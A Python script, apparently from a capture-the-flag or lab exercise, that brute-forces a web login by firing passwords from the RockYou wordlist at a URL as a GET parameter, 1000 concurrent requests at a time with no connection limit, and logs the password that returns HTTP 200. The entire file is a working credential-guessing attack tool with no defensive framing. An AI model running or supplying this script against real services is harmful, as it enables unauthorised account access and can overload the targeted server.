import asyncio
import aiohttp
import time
from logger import logger
from env import get_url
import os

CONCURRENT_ATTEMPTS = 1000  # Adjust based on the performance of the server

# Asynchronous function to attempt login with a password
async def try_password(session, url, password):
    params = {'password': password}
    try:
        async with session.get(url, params=params) as response:
            return password, response.status, await response.text()
    except asyncio.TimeoutError:
        logger.debug(f"Timeout with password: {password}")
        return password, None, None

# Read passwords from RockYou.txt
def read_passwords_from_file(filepath):
    logger.debug(f"Reading passwords from {filepath}")
    
    if not os.path.exists(filepath):
        logger.error(f"File {filepath} does not exist")
        return
    
    with open(filepath, 'r', encoding='latin-1') as f:  # 'latin-1' encoding is used for RockYou
        for line in f:
            yield line.strip()
            ## the yield goes into passwords

    logger.debug("Finished reading passwords")

# Asynchronous brute force function with passwords from RockYou.txt
async def rock_you_force_password(session, url, passwords):
    tasks = []
    
    for password in passwords:
        tasks.append(try_password(session, url, password))
        ## keep adding tasks until we reach the limit
        if len(tasks) >= CONCURRENT_ATTEMPTS:
            results = await asyncio.gather(*tasks)
            for password, status, text in results:
                if status == 200:
                    logger.critical(f"Password found: {password}")
                    logger.critical(f"Response: {text}")
                    return password
                else:
                    logger.debug(f"Password {password} failed")
            tasks = []  # Reset tasks once done

    # Process any remaining passwords if they exist
    if tasks:
        results = await asyncio.gather(*tasks)
        for password, status, text in results:
            if status == 200:
                logger.critical(f"Password found: {password}")
                logger.critical(f"Response: {text}")
                return password
            else:
                logger.debug(f"Password {password} failed")

# Main function to read passwords and attempt login
async def main():
    url = get_url()
    start_time = time.time()
    
    # Read passwords from the RockYou.txt file
    passwords = read_passwords_from_file('RockYou.txt')  # Adjust path if needed

    ## suggested to use tcpconnecter limit = 0
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=0)) as session:
        password = await rock_you_force_password(session, url, passwords)
        if password:
            time_elapsed = time.time() - start_time
            logger.critical(f"Time taken to find the password: {time_elapsed:.2f} seconds")
        else:
            logger.critical("Password not found")
    
if __name__ == '__main__':
    asyncio.run(main())
